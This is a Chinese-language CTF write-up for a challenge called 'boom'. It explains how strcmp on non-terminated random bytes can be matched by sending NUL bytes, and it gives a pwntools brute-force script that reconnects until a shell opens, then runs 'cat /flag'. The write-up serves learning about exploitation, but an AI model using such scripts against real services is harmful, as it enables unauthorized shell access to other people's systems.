# boom

## 题目简述

程序从 `/dev/random` 读取 `0x30` 个随机字节到全局 `secret`，再读取同样长度的用户输入并调用 `strcmp(input, secret)`。随机数据不是以 NUL 结尾的 C 字符串；只要随机首字节恰好为 `\x00`，发送首字节同为 NUL 的输入就会让 `strcmp` 立即判定两个空字符串相等，进入 `system("/bin/sh")` 分支。

## 解题过程

反汇编可还原出主线：

```c
read(random_fd, secret, 0x30);
read(0, input, 0x30);
if (strcmp(input, secret) == 0) {
    puts("WOW,you can get her!");
    system("/bin/sh");
}
```

`strcmp` 从第一个字节开始比较，遇到差异或双方同时遇到 `\0` 时停止。每次新进程中 `secret[0] == 0` 的概率为：

$$
\Pr[\text{success}]=\frac{1}{256}
$$

因此不断重连并发送 48 个 NUL 字节。必须使用 `sendafter` 发送原始字节，不能用会附加换行的文本输入代替。

```python
from pwn import context, remote

context(arch="amd64", os="linux")

attempt = 0
while True:
    attempt += 1
    io = remote("HOST", PORT)
    io.sendafter(b"her thinking?", b"\x00" * 0x30)

    output = io.recvrepeat(1)
    if b"WOW,you can get her!" in output:
        print(f"success after {attempt} attempts")
        io.sendline(b"cat /flag")
        io.interactive()
        break
    else:
        io.close()
```

仓库二进制只包含成功后启动 shell 的逻辑，没有保存比赛环境 `/flag` 的实际内容；最终以当前实例中 `cat /flag` 的输出为准。

## 方法总结

漏洞根因是把固定长度随机二进制数据交给要求 NUL 结尾的 `strcmp`。不需要猜中全部 48 字节，只需利用首字节为零的事件把两边都截断为空字符串；代价是平均约 256 次独立连接。
